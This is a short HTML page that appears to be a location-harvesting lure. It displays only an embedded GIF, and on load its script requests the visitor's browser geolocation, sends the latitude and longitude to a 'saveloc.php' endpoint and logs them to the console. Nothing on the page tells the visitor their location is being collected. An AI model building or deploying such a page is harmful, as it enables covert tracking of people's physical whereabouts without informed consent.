<html lang="en">

<body onload="getLocation()">
    <iframe src="https://giphy.com/embed/Y2jqxdgfQfnIEdc7kj" width="480" height="360" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
</body>

<script>

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
    const xhttp = new XMLHttpRequest();
    xhttp.open("GET", "saveloc.php?lat="+position.coords.latitude + "&lang="+position.coords.longitude );
    xhttp.send();

  x.innerHTML = "Latitude: " + position.coords.latitude + 
  "<br>Longitude: " + position.coords.longitude;
  console.log(position.coords.latitude +",,,,,"+ position.coords.longitude);
}

</script>
</html>
